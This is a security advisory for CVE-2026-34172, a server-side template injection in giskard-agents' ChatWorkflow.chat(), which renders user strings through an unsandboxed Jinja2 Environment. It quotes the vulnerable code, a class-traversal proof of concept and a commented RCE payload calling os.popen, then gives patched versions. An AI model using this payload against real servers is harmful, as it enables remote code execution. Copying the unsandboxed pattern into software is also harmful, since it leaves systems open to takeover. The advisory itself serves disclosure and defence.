# [H] Giskard Agents have Server-side template injection via ChatWorkflow.chat() using non-sandboxed Jinja2 Environment

## Summary
Severity: High
Advisory: GHSA-frv4-x25r-588m
CVE: CVE-2026-34172
CWE: CWE-1336
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-frv4-x25r-588m
Type: github-advisory

## Affected
- PyPI: `giskard-agents` — affected >=0 <0.3.4
- PyPI: `giskard-agents` — affected >=1.0.1a1 <1.0.2b1

## Details
## Summary

`ChatWorkflow.chat(message)` passes its string argument directly as a Jinja2 template source to a non-sandboxed `Environment`. A developer who passes user input to this method enables full remote code execution via Jinja2 class traversal.

The method name `chat` and parameter name `message` naturally invite passing user input directly, but the string is silently parsed as a Jinja2 template, not treated as plain text.

## Root Cause

`libs/giskard-agents/src/giskard/agents/workflow.py` line ~261:
```python
def chat(self, message: str | Message | MessageTemplate, role: Role = "user") -> Self:
    if isinstance(message, str):
        message = MessageTemplate(role=role, content_template=message)
```

The string becomes `content_template`, which is parsed by `from_string()`:

`libs/giskard-agents/src/giskard/agents/templates/message.py` lines 14-15:
```python
def render(self, **kwargs: Any) -> Message:
    template = _inline_env.from_string(self.content_template)
    rendered_content = template.render(**kwargs)
```

The Jinja2 Environment is not sandboxed:

`libs/giskard-agents/src/giskard/agents/templates/environment.py` line 37:
```python
_inline_env = Environment(
    autoescape=False,
    # Not SandboxedEnvironment
)
```

## Proof of Concept

```python
from jinja2 import Environment
env = Environment()  # Same as giskard's _inline_env

# Class traversal reaches os.popen
t = env.from_string("{{ ''.__class__.__mro__[1].__subclasses__() | length }}")
print(t.render())  # 342 accessible subclasses

# Full RCE payload (subclass index varies by Python version)
# {{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}
```

A developer building a chatbot:
```python
workflow = ChatWorkflow(generator=my_llm)
workflow = workflow.chat(user_input)  # user_input parsed as Jinja2 template
result = await workflow.run()          # RCE if user_input contains {{ payload }}
```

Note: using `.with_inputs(var=user_data)` is safe because variable values are not parsed as templates. The issue is only when user strings are passed directly to `chat()`.

## Impact

Remote code execution on the server hosting any application built with giskard-agents that passes user input to `ChatWorkflow.chat()`. Attacker can execute system commands, read files, access environment variables.

Affects giskard-agents <=0.3.3 and 1.0.x alpha. Patched in giskard-agents 0.3.4 (stable) and 1.0.2b1 (pre-release).

# Mitigation

Update to 0.3.4 (or 1.0.2b1 for the pre-release branch) which includes the fix.

The fix replaces the unsandboxed Jinja2 Environment with `SandboxedEnvironment`, which blocks attribute access to dunder methods and prevents class traversal chains. `SandboxedEnvironment` blocks access to attributes starting with `_`, preventing the `__class__.__mro__` traversal chain.

## References
- https://github.com/Giskard-AI/giskard-oss/security/advisories/GHSA-frv4-x25r-588m
- https://nvd.nist.gov/vuln/detail/CVE-2026-34172
- https://github.com/Giskard-AI/giskard-oss
